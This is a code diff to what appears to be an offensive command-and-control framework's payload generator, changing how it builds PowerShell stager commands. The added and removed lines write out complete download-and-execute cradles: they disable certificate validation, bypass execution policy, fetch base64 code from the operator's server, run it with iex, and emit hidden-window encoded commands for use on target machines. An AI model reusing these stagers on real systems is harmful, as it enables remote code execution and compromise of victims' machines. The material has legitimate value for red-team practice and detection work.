@@ -168,19 +168,14 @@ class Payloads(object):
 
         if name == "":
             ps_uri = f"{self.first_url}/{self.hosted_files_url}_rp"
-            powershell_command = f"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('{ps_uri}')));IEX $MS"
-            base64_powershell_command = base64.b64encode(powershell_command.encode('UTF-16LE'))
-            self.quickstart_log(
-                f"\npowershell -exec bypass -Noninteractive -windowstyle hidden -e {base64_powershell_command.decode('UTF-8')}")
-
-            powershell_command = f"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('{ps_uri}'))))"
+            powershell_command = f"Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('{ps_uri}'))))"
             base64_powershell_command = base64.b64encode(powershell_command.encode('UTF-16LE'))
 
             self.quickstart_log(
-                f"\npowershell -exec bypass -Noninteractive -windowstyle hidden -e {base64_powershell_command.decode('UTF-8')}")
+                f"\npowershell -Noninteractive -windowstyle hidden -e {base64_powershell_command.decode('UTF-8')}")
 
             self.quickstart_log(
-                f"\npowershell -c Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('{ps_uri}'))))")
+                f"\npowershell -c {powershell_command}")
 
     def create_droppers(self, name="", pbind_only=False, debug_payloads=False):
         self.quickstart_log(Colours.END)
